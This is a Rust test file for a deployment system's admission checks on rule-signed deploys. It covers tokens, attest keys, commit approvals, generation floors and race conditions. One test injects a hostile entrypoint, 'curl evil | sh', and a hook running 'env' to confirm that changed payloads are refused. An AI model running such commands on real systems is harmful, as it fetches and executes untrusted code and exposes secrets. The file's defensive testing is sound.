#![expect(clippy::indexing_slicing, reason = "JSON fixtures")]

use ployz_core::{
    GithubToken, Namespace,
    authority::{
        AttestKey, AuthorityRefusal, BuildClaim, BuildStage, CommitSha, ImageDigest, RuleProof,
        Signed, Timestamp,
    },
};
use serde_json::{Value, json};

use super::super::rule_grant::tests::{
    Fixture, claim_for, commit, fixture, github, now, rule_for, token_for,
};
use super::*;

const IMAGE: &str = "4444444444444444444444444444444444444444444444444444444444444444";

fn spec() -> Value {
    json!({
        "name": "web",
        "mode": {"mode": "replicated", "replicas": 1},
        "container": {
            "image": format!("ployz-build/web@sha256:{IMAGE}"),
            "pull_policy": "missing",
            "environment": {"PLAIN": "one"}
        },
        "pre_deploy": {"command": ["migrate"]}
    })
}

fn requested(spec: &Value) -> ployz_core::RequestedServiceSpec {
    serde_json::from_value(spec.clone()).unwrap()
}

fn want(kind: &str, key: &str, spec: &Value) -> ContainerWant {
    let resolved = requested(spec)
        .to_resolved(
            ployz_core::ServiceId::parse("c".repeat(32)).unwrap(),
            ployz_core::ResolvedUpdateConfig::default(),
        )
        .unwrap();
    serde_json::from_value(
        json!({"state":"running", "rotation":"pending", "container":{"new":{
        "slot":{"namespace":"app", "service":"web", "kind":kind, "creation_key":key},
        "resolved_spec":resolved, "gen":1}}}),
    )
    .unwrap()
}

impl Fixture {
    fn attest(&self) -> AttestKey {
        self.machine
            .held_attest(self.machine.record().phase())
            .unwrap()
    }

    /// The fixture's rule at `generation`, approving `spec()`'s settings.
    fn deploy_rule(&self, generation: u64) -> ployz_core::authority::AutoDeployRule {
        let mut rule = rule_for(
            self.cluster,
            self.machine.record().id(),
            &self.signer,
            &self.record,
        );
        rule.generation = generation;
        rule.services[0].template = ployz_core::authority::rule::template(
            &requested(&spec()),
            &Namespace::parse("app").unwrap(),
        )
        .unwrap();
        rule
    }

    /// The image claim of the head's build under `rule`, sealed from `attest`.
    fn built(&self, rule: &ployz_core::authority::AutoDeployRule, attest: AttestKey) -> BuildClaim {
        BuildClaim {
            stage: BuildStage::Built {
                image: ImageDigest::parse(&format!("sha256:{IMAGE}")).unwrap(),
                attest,
            },
            ..claim_for(self.cluster, rule)
        }
    }

    fn proof(
        &self,
        rule: &ployz_core::authority::AutoDeployRule,
        claim: &BuildClaim,
        token: String,
    ) -> RuleProof {
        RuleProof {
            rule: Signed::sign(rule, &self.signer).unwrap(),
            token: GithubToken::new(token),
            claim: claim.clone(),
            approval: None,
            reader: None,
        }
    }

    async fn deploy(
        &self,
        want: ContainerWant,
        proof: &RuleProof,
        head: CommitSha,
        at: Timestamp,
    ) -> Result<ContainerWant, Error> {
        self.machine
            .admit_rule_deploy(want, proof, &github(head), at)
            .await
    }
}

fn refused(result: Result<ContainerWant, Error>) -> String {
    match result {
        Err(Error::RuleDeployRefused(RuleDeployRefusal::Rule(AuthorityRefusal::Mismatch {
            field,
        }))) => field.to_owned(),
        Err(Error::RuleDeployRefused(RuleDeployRefusal::Proof(refusal))) => {
            format!("proof: {refusal}")
        }
        other => panic!("not a rule refusal: {other:?}"),
    }
}

fn after_expiry() -> Timestamp {
    Timestamp::from_millis(now().as_millis() + 3_600_000).unwrap()
}

#[tokio::test]
async fn a_rule_creates_the_heads_image_with_the_settings_it_approves() {
    let fixture = fixture().await;
    let rule = fixture.deploy_rule(3);
    let claim = fixture.built(&rule, fixture.attest());
    let proof = fixture.proof(&rule, &claim, token_for(&claim, "built-1"));
    fixture
        .deploy(
            want("service_container", "k1", &spec()),
            &proof,
            commit(),
            now(),
        )
        .await
        .unwrap();
}

#[tokio::test]
async fn an_image_token_that_names_a_foreign_attest_key_is_refused() {
    let fixture = fixture().await;
    let rule = fixture.deploy_rule(3);
    let claim = fixture.built(&rule, AttestKey::from_bytes([0x77; 32]));
    let proof = fixture.proof(&rule, &claim, token_for(&claim, "foreign"));
    assert_eq!(
        refused(
            fixture
                .deploy(
                    want("service_container", "k1", &spec()),
                    &proof,
                    commit(),
                    now()
                )
                .await
        ),
        "the attest key"
    );
}

#[tokio::test]
async fn a_claim_the_token_does_not_name_is_refused_as_the_audience() {
    let fixture = fixture().await;
    let rule = fixture.deploy_rule(3);
    let claim = fixture.built(&rule, fixture.attest());
    let other = BuildClaim {
        stage: BuildStage::Built {
            image: ImageDigest::from_bytes([0x66; 32]),
            attest: fixture.attest(),
        },
        ..claim.clone()
    };
    // Cloud relays the token of one image with the claim of another.
    let proof = fixture.proof(&rule, &claim, token_for(&other, "swap"));
    assert_eq!(
        refused(
            fixture
                .deploy(
                    want("service_container", "k1", &spec()),
                    &proof,
                    commit(),
                    now()
                )
                .await
        ),
        "an audience"
    );
}

#[tokio::test]
async fn an_accepted_build_creates_again_after_its_token_expires_until_the_head_moves() {
    let fixture = fixture().await;
    let rule = fixture.deploy_rule(3);
    let claim = fixture.built(&rule, fixture.attest());
    let proof = fixture.proof(&rule, &claim, token_for(&claim, "accepted"));
    let fresh = fixture
        .deploy(
            want("service_container", "k1", &spec()),
            &proof,
            commit(),
            after_expiry(),
        )
        .await;
    assert!(
        refused(fresh).starts_with("proof:"),
        "an expired token alone admits nothing"
    );
    fixture
        .deploy(
            want("service_container", "k1", &spec()),
            &proof,
            commit(),
            now(),
        )
        .await
        .unwrap();
    fixture
        .deploy(
            want("service_container", "k2", &spec()),
            &proof,
            commit(),
            after_expiry(),
        )
        .await
        .unwrap();
    let moved = CommitSha::parse(&"9".repeat(40)).unwrap();
    assert_eq!(
        refused(
            fixture
                .deploy(
                    want("service_container", "k3", &spec()),
                    &proof,
                    moved,
                    after_expiry()
                )
                .await
        ),
        "a commit"
    );
}

#[tokio::test]
async fn a_push_runs_its_hook_once() {
    let fixture = fixture().await;
    let rule = fixture.deploy_rule(3);
    let claim = fixture.built(&rule, fixture.attest());
    let proof = fixture.proof(&rule, &claim, token_for(&claim, "hook"));
    fixture
        .deploy(
            want("pre_deploy_hook", "h1", &spec()),
            &proof,
            commit(),
            now(),
        )
        .await
        .unwrap();
    // A resend of the same slot adopts the hook that ran.
    fixture
        .deploy(
            want("pre_deploy_hook", "h1", &spec()),
            &proof,
            commit(),
            now(),
        )
        .await
        .unwrap();
    assert_eq!(
        refused(
            fixture
                .deploy(
                    want("pre_deploy_hook", "h2", &spec()),
                    &proof,
                    commit(),
                    now()
                )
                .await
        ),
        "a hook run"
    );
}

#[tokio::test]
async fn a_newer_generation_refuses_every_proof_below_it() {
    let fixture = fixture().await;
    let old = fixture.deploy_rule(3);
    let claim = fixture.built(&old, fixture.attest());
    let stale = fixture.proof(&old, &claim, token_for(&claim, "old"));
    let new = fixture.deploy_rule(4);
    let claim4 = fixture.built(&new, fixture.attest());
    let current = fixture.proof(&new, &claim4, token_for(&claim4, "new"));
    fixture
        .deploy(
            want("service_container", "k1", &spec()),
            &current,
            commit(),
            now(),
        )
        .await
        .unwrap();
    assert_eq!(
        refused(
            fixture
                .deploy(
                    want("service_container", "k2", &spec()),
                    &stale,
                    commit(),
                    now()
                )
                .await
        ),
        "a generation"
    );
}

/// GitHub that answers the read at `at` only once `release` fires, telling `reached` it
/// was asked.
struct Slow {
    inner: super::super::rule_grant::FixedGithub,
    at: SlowAt,
    reached: tokio::sync::Notify,
    release: tokio::sync::Notify,
}

#[derive(PartialEq)]
enum SlowAt {
    Head,
    Token,
}

impl Slow {
    fn new(inner: super::super::rule_grant::FixedGithub, at: SlowAt) -> Self {
        Self {
            inner,
            at,
            reached: tokio::sync::Notify::new(),
            release: tokio::sync::Notify::new(),
        }
    }

    async fn wait(&self, at: SlowAt) {
        if self.at == at {
            self.reached.notify_one();
            self.release.notified().await;
        }
    }
}

impl Github for Slow {
    async fn claims(
        &self,
        rule: &impl ployz_core::authority::ClaimRule,
        token: &str,
        freshness: crate::github::oidc::Freshness<'_>,
    ) -> Result<ployz_core::authority::GithubClaims, crate::github::oidc::ProofRefusal> {
        self.wait(SlowAt::Token).await;
        self.inner.claims(rule, token, freshness).await
    }

    async fn head(
        &self,
        repository_id: u64,
        branch: &str,
        reader: Option<&GithubToken>,
    ) -> Result<CommitSha, crate::github::head::HeadError> {
        self.wait(SlowAt::Head).await;
        self.inner.head(repository_id, branch, reader).await
    }

    async fn ancestry(
        &self,
        repository_id: u64,
        commit: CommitSha,
        head: CommitSha,
        reader: Option<&GithubToken>,
    ) -> Result<crate::github::head::Ancestry, crate::github::head::HeadError> {
        self.inner
            .ancestry(repository_id, commit, head, reader)
            .await
    }
}

#[tokio::test]
async fn a_newer_generation_landing_during_the_head_read_refuses_the_older_one() {
    let fixture = fixture().await;
    let old = fixture.deploy_rule(3);
    let claim = fixture.built(&old, fixture.attest());
    let stale = fixture.proof(&old, &claim, token_for(&claim, "old"));
    let new = fixture.deploy_rule(4);
    let claim4 = fixture.built(&new, fixture.attest());
    let current = fixture.proof(&new, &claim4, token_for(&claim4, "new"));
    let slow = Slow::new(github(commit()), SlowAt::Head);
    let (in_flight, ()) = tokio::join!(
        fixture.machine.admit_rule_deploy(
            want("service_container", "k1", &spec()),
            &stale,
            &slow,
            now()
        ),
        async {
            slow.reached.notified().await;
            fixture
                .deploy(
                    want("service_container", "k2", &spec()),
                    &current,
                    commit(),
                    now(),
                )
                .await
                .unwrap();
            slow.release.notify_one();
        }
    );
    assert_eq!(refused(in_flight), "a generation");
}

#[tokio::test]
async fn an_ended_rule_deploys_nothing() {
    let fixture = fixture().await;
    let mut rule = fixture.deploy_rule(4);
    rule.ended = true;
    let claim = fixture.built(&rule, fixture.attest());
    let proof = fixture.proof(&rule, &claim, token_for(&claim, "ended"));
    assert_eq!(
        refused(
            fixture
                .deploy(
                    want("service_container", "k1", &spec()),
                    &proof,
                    commit(),
                    now()
                )
                .await
        ),
        "an ended rule"
    );
}

#[tokio::test]
async fn a_changed_setting_is_refused_as_the_payload() {
    let fixture = fixture().await;
    let rule = fixture.deploy_rule(3);
    let claim = fixture.built(&rule, fixture.attest());
    let proof = fixture.proof(&rule, &claim, token_for(&claim, "payload"));
    let mut privileged = spec();
    privileged["container"]["privileged"] = json!(true);
    assert_eq!(
        refused(
            fixture
                .deploy(
                    want("service_container", "k1", &privileged),
                    &proof,
                    commit(),
                    now()
                )
                .await
        ),
        "a payload"
    );
}

mod approved {
    //! A rollback or redeploy of a built image under a person's commit approval, in place
    //! of the branch head.

    use ployz_core::authority::{
        ApprovalDigest, AutoDeployRule, CommitApproval, CommitAuthority, Signer, SignerKey,
    };

    use super::super::super::rule_grant::tests::claims;
    use super::*;
    use crate::github::test_support::signed_by_test_signer;

    /// The head the branch moved to after the build.
    fn moved() -> CommitSha {
        CommitSha::parse(&"9".repeat(40)).unwrap()
    }

    /// An approval of `rule`'s web at `commit`, live at `at`.
    fn approval(fixture: &Fixture, rule: &AutoDeployRule, at: Timestamp) -> CommitApproval {
        CommitApproval {
            cluster: fixture.cluster,
            rule: rule.rule,
            generation: rule.generation,
            service: ServiceName::parse("web").unwrap(),
            commit: commit(),
            issued_at: Timestamp::from_millis(at.as_millis() - 60_000).unwrap(),
            expires_at: Timestamp::from_millis(at.as_millis() + 14 * 60_000).unwrap(),
            signer: SignerKey::Device(fixture.signer.public().into()),
        }
    }

    impl Fixture {
        /// The fixture's proof of `claim` under `rule`, carrying `approval` signed by
        /// its Device.
        fn approved(
            &self,
            rule: &AutoDeployRule,
            claim: &BuildClaim,
            token: String,
            approval: &CommitApproval,
        ) -> RuleProof {
            RuleProof {
                approval: Some(Signed::sign(approval, &self.signer).unwrap()),
                ..self.proof(rule, claim, token)
            }
        }

        /// The image claim of a build of [`commit`] someone approved under `rule`.
        fn built_approved(&self, rule: &AutoDeployRule, approval: &CommitApproval) -> BuildClaim {
            let signed = Signed::sign(approval, &self.signer).unwrap();
            BuildClaim {
                authority: CommitAuthority::Approved(ApprovalDigest::of(&signed)),
                ..self.built(rule, self.attest())
            }
        }
    }

    fn rule_refusal(result: Result<ContainerWant, Error>) -> AuthorityRefusal {
        match result {
            Err(Error::RuleDeployRefused(RuleDeployRefusal::Rule(refusal))) => refusal,
            other => panic!("not a rule refusal: {other:?}"),
        }
    }

    #[tokio::test]
    async fn an_approval_rolls_back_to_a_commit_the_head_moved_past() {
        let fixture = fixture().await;
        let rule = fixture.deploy_rule(3);
        let claim = fixture.built(&rule, fixture.attest());
        let bare = fixture.proof(&rule, &claim, token_for(&claim, "bare"));
        assert_eq!(
            refused(
                fixture
                    .deploy(
                        want("service_container", "k0", &spec()),
                        &bare,
                        moved(),
                        now()
                    )
                    .await
            ),
            "a commit",
            "without an approval the head still gates the commit"
        );
        let proof = fixture.approved(
            &rule,
            &claim,
            token_for(&claim, "rollback"),
            &approval(&fixture, &rule, now()),
        );
        fixture
            .deploy(
                want("service_container", "k1", &spec()),
                &proof,
                moved(),
                now(),
            )
            .await
            .unwrap();
    }

    #[tokio::test]
    async fn each_newer_approval_runs_the_commits_hook_once_more() {
        let fixture = fixture().await;
        let rule = fixture.deploy_rule(3);
        let claim = fixture.built(&rule, fixture.attest());
        let hook = |key: &'static str| want("pre_deploy_hook", key, &spec());
        let push = fixture.proof(&rule, &claim, token_for(&claim, "push"));
        fixture
            .deploy(hook("h1"), &push, commit(), now())
            .await
            .unwrap();
        let first = approval(&fixture, &rule, now());
        let redeploy = fixture.approved(&rule, &claim, token_for(&claim, "first"), &first);
        fixture
            .deploy(hook("h2"), &redeploy, moved(), now())
            .await
            .unwrap();
        // The same approval resent for its slot adopts the hook; another slot is refused.
        fixture
            .deploy(hook("h2"), &redeploy, moved(), now())
            .await
            .unwrap();
        assert_eq!(
            refused(fixture.deploy(hook("h3"), &redeploy, moved(), now()).await),
            "a hook run"
        );
        // An approval signed no later than the one the hook last ran under runs nothing.
        let mut older = approval(&fixture, &rule, now());
        older.issued_at = Timestamp::from_millis(first.issued_at.as_millis() - 1).unwrap();
        older.expires_at = Timestamp::from_millis(first.expires_at.as_millis() - 1).unwrap();
        let replayed = fixture.approved(&rule, &claim, token_for(&claim, "older"), &older);
        assert_eq!(
            refused(fixture.deploy(hook("h4"), &replayed, moved(), now()).await),
            "a hook run"
        );
        let mut second = approval(&fixture, &rule, now());
        second.issued_at = Timestamp::from_millis(first.issued_at.as_millis() + 1).unwrap();
        let again = fixture.approved(&rule, &claim, token_for(&claim, "second"), &second);
        fixture
            .deploy(hook("h5"), &again, moved(), now())
            .await
            .unwrap();
        // The push's own proof cannot take the hook back.
        assert_eq!(
            refused(fixture.deploy(hook("h6"), &push, commit(), now()).await),
            "a hook run"
        );
    }

    #[tokio::test]
    async fn an_expired_token_deploys_only_under_a_live_approval() {
        let fixture = fixture().await;
        let rule = fixture.deploy_rule(3);
        let claim = fixture.built(&rule, fixture.attest());
        let proof = fixture.approved(
            &rule,
            &claim,
            token_for(&claim, "old-token"),
            &approval(&fixture, &rule, after_expiry()),
        );
        fixture
            .deploy(
                want("service_container", "k1", &spec()),
                &proof,
                moved(),
                after_expiry(),
            )
            .await
            .unwrap();
        // A second Machine sees the same token with no approval: GitHub's clock rules.
        let other = super::fixture().await;
        let rule = other.deploy_rule(3);
        let claim = other.built(&rule, other.attest());
        let bare = other.proof(&rule, &claim, token_for(&claim, "old-token"));
        assert!(
            refused(
                other
                    .deploy(
                        want("service_container", "k1", &spec()),
                        &bare,
                        commit(),
                        after_expiry()
                    )
                    .await
            )
            .starts_with("proof:")
        );
    }

    #[tokio::test]
    async fn a_token_from_a_rotated_github_key_is_refused_naming_the_key() {
        let fixture = fixture().await;
        let rule = fixture.deploy_rule(3);
        let claim = fixture.built(&rule, fixture.attest());
        let mut token = claims();
        token["aud"] = json!(claim.audience().unwrap());
        token["jti"] = json!("rotated");
        token["event_name"] = json!("push");
        token["sha"] = json!(commit().to_string());
        let token = signed_by_test_signer("rotated-key", &token);
        let proof = fixture.approved(&rule, &claim, token, &approval(&fixture, &rule, now()));
        let refusal = refused(
            fixture
                .deploy(
                    want("service_container", "k1", &spec()),
                    &proof,
                    moved(),
                    now(),
                )
                .await,
        );
        assert_eq!(
            refusal,
            "proof: GitHub publishes no token key named rotated-key"
        );
    }

    #[tokio::test]
    async fn an_approval_of_another_service_or_commit_is_refused() {
        let fixture = fixture().await;
        let rule = fixture.deploy_rule(3);
        let claim = fixture.built(&rule, fixture.attest());
        for (key, edit) in [
            (
                "service",
                (|approval: &mut CommitApproval| {
                    approval.service = ServiceName::parse("api").unwrap();
                }) as fn(&mut CommitApproval),
            ),
            ("commit", |approval: &mut CommitApproval| {
                approval.commit = CommitSha::parse(&"5".repeat(40)).unwrap();
            }),
        ] {
            let mut approval = approval(&fixture, &rule, now());
            edit(&mut approval);
            let proof = fixture.approved(&rule, &claim, token_for(&claim, key), &approval);
            assert_eq!(
                refused(
                    fixture
                        .deploy(
                            want("service_container", key, &spec()),
                            &proof,
                            moved(),
                            now()
                        )
                        .await
                ),
                "an approval",
                "{key}"
            );
        }
    }

    #[tokio::test]
    async fn an_expired_approval_is_refused() {
        let fixture = fixture().await;
        let rule = fixture.deploy_rule(3);
        let claim = fixture.built(&rule, fixture.attest());
        let mut approval = approval(&fixture, &rule, now());
        approval.issued_at = Timestamp::from_millis(now().as_millis() - 40 * 60_000).unwrap();
        approval.expires_at = Timestamp::from_millis(now().as_millis() - 25 * 60_000).unwrap();
        let proof = fixture.approved(&rule, &claim, token_for(&claim, "late"), &approval);
        assert!(matches!(
            rule_refusal(
                fixture
                    .deploy(
                        want("service_container", "k1", &spec()),
                        &proof,
                        moved(),
                        now()
                    )
                    .await
            ),
            AuthorityRefusal::Expired
        ));
    }

    /// Hole 1: an approval of the commit does not let Cloud swap the image.
    #[tokio::test]
    async fn an_approved_rollback_runs_only_the_image_the_token_names() {
        let fixture = fixture().await;
        let rule = fixture.deploy_rule(3);
        let claim = fixture.built(&rule, fixture.attest());
        let proof = fixture.approved(
            &rule,
            &claim,
            token_for(&claim, "image"),
            &approval(&fixture, &rule, now()),
        );
        let mut swapped = spec();
        swapped["container"]["image"] = json!(format!("ployz-build/web@sha256:{}", "5".repeat(64)));
        assert_eq!(
            refused(
                fixture
                    .deploy(
                        want("service_container", "k1", &swapped),
                        &proof,
                        moved(),
                        now()
                    )
                    .await
            ),
            "an image"
        );
    }

    /// Hole 2: an approval of the commit does not let Cloud change a setting the rule
    /// approves.
    #[tokio::test]
    async fn an_approved_rollback_runs_only_the_settings_the_rule_approves() {
        let fixture = fixture().await;
        let rule = fixture.deploy_rule(3);
        let claim = fixture.built(&rule, fixture.attest());
        let proof = fixture.approved(
            &rule,
            &claim,
            token_for(&claim, "payload"),
            &approval(&fixture, &rule, now()),
        );
        for (key, edit) in [
            (
                "entrypoint",
                (|spec: &mut Value| {
                    spec["container"]["entrypoint"] = json!(["sh", "-c", "curl evil | sh"]);
                }) as fn(&mut Value),
            ),
            ("hook", |spec: &mut Value| {
                spec["pre_deploy"]["command"] = json!(["sh", "-c", "env"]);
            }),
            ("plain", |spec: &mut Value| {
                spec["container"]["environment"]["PLAIN"] = json!("two");
            }),
        ] {
            let mut changed = spec();
            edit(&mut changed);
            assert_eq!(
                refused(
                    fixture
                        .deploy(
                            want("service_container", key, &changed),
                            &proof,
                            moved(),
                            now()
                        )
                        .await
                ),
                "a payload",
                "{key}"
            );
        }
    }

    /// Hole 3: a live approval of an older generation does not lift the floor.
    #[tokio::test]
    async fn an_approval_of_a_generation_below_the_mark_is_refused() {
        let fixture = fixture().await;
        let new = fixture.deploy_rule(4);
        let claim4 = fixture.built(&new, fixture.attest());
        fixture
            .deploy(
                want("service_container", "k1", &spec()),
                &fixture.proof(&new, &claim4, token_for(&claim4, "new")),
                commit(),
                now(),
            )
            .await
            .unwrap();
        let old = fixture.deploy_rule(3);
        let claim = fixture.built(&old, fixture.attest());
        let proof = fixture.approved(
            &old,
            &claim,
            token_for(&claim, "old"),
            &approval(&fixture, &old, now()),
        );
        assert_eq!(
            refused(
                fixture
                    .deploy(
                        want("service_container", "k2", &spec()),
                        &proof,
                        moved(),
                        now()
                    )
                    .await
            ),
            "a generation"
        );
    }

    /// Hole 4 and finding 5: a rule only a key this Machine does not trust signed admits
    /// nothing, whoever approves the commit.
    #[tokio::test]
    async fn a_rule_signed_by_a_key_this_machine_does_not_trust_is_refused_under_an_approval() {
        let fixture = fixture().await;
        let rule = fixture.deploy_rule(3);
        let claim = fixture.built(&rule, fixture.attest());
        let stranger = Signer::from_seed(&[9; 32]);
        let mut forged = rule.clone();
        forged.signer = SignerKey::Device(stranger.public().into());
        let proof = RuleProof {
            rule: Signed::sign(&forged, &stranger).unwrap(),
            ..fixture.approved(
                &rule,
                &claim,
                token_for(&claim, "forged"),
                &approval(&fixture, &rule, now()),
            )
        };
        assert!(matches!(
            rule_refusal(
                fixture
                    .deploy(
                        want("service_container", "k1", &spec()),
                        &proof,
                        moved(),
                        now()
                    )
                    .await
            ),
            AuthorityRefusal::UnknownKey { .. }
        ));
    }

    /// Finding 6 under an approval: secrets sealed from another Machine's attest key.
    #[tokio::test]
    async fn an_approved_rollback_of_a_foreign_attest_key_is_refused() {
        let fixture = fixture().await;
        let rule = fixture.deploy_rule(3);
        let claim = fixture.built(
            &rule,
            ployz_core::authority::AttestKey::from_bytes([0x77; 32]),
        );
        let proof = fixture.approved(
            &rule,
            &claim,
            token_for(&claim, "foreign"),
            &approval(&fixture, &rule, now()),
        );
        assert_eq!(
            refused(
                fixture
                    .deploy(
                        want("service_container", "k1", &spec()),
                        &proof,
                        moved(),
                        now()
                    )
                    .await
            ),
            "the attest key"
        );
    }

    #[tokio::test]
    async fn an_approval_under_an_ended_rule_is_refused() {
        let fixture = fixture().await;
        let mut rule = fixture.deploy_rule(4);
        rule.ended = true;
        let claim = fixture.built(&rule, fixture.attest());
        let proof = fixture.approved(
            &rule,
            &claim,
            token_for(&claim, "ended"),
            &approval(&fixture, &rule, now()),
        );
        assert_eq!(
            refused(
                fixture
                    .deploy(
                        want("service_container", "k1", &spec()),
                        &proof,
                        moved(),
                        now()
                    )
                    .await
            ),
            "an ended rule"
        );
    }

    /// The regression: an image built for an approval deploys only under one, never on
    /// a branch head that happens to name its commit.
    #[tokio::test]
    async fn an_approved_build_without_an_approval_is_refused_as_the_authority() {
        let fixture = fixture().await;
        let rule = fixture.deploy_rule(3);
        let built = approval(&fixture, &rule, now());
        let claim = fixture.built_approved(&rule, &built);
        let bare = fixture.proof(&rule, &claim, token_for(&claim, "bare"));
        assert_eq!(
            refused(
                fixture
                    .deploy(
                        want("service_container", "k1", &spec()),
                        &bare,
                        commit(),
                        now()
                    )
                    .await
            ),
            "an authority"
        );
        // With a fresh approval of the commit, the same image deploys.
        let proof = fixture.approved(&rule, &claim, token_for(&claim, "fresh"), &built);
        fixture
            .deploy(
                want("service_container", "k2", &spec()),
                &proof,
                moved(),
                now(),
            )
            .await
            .unwrap();
    }

    /// A newer generation landing while the token is checked refuses the approved older
    /// one, as it does during a head read.
    #[tokio::test]
    async fn a_newer_generation_landing_during_the_token_check_refuses_an_approved_one() {
        let fixture = fixture().await;
        let old = fixture.deploy_rule(3);
        let claim = fixture.built(&old, fixture.attest());
        let stale = fixture.approved(
            &old,
            &claim,
            token_for(&claim, "old"),
            &approval(&fixture, &old, now()),
        );
        let new = fixture.deploy_rule(4);
        let claim4 = fixture.built(&new, fixture.attest());
        let current = fixture.proof(&new, &claim4, token_for(&claim4, "new"));
        let slow = Slow::new(github(moved()), SlowAt::Token);
        let (in_flight, ()) = tokio::join!(
            fixture.machine.admit_rule_deploy(
                want("service_container", "k1", &spec()),
                &stale,
                &slow,
                now()
            ),
            async {
                slow.reached.notified().await;
                fixture
                    .deploy(
                        want("service_container", "k2", &spec()),
                        &current,
                        commit(),
                        now(),
                    )
                    .await
                    .unwrap();
                slow.release.notify_one();
            }
        );
        assert_eq!(refused(in_flight), "a generation");
    }
}
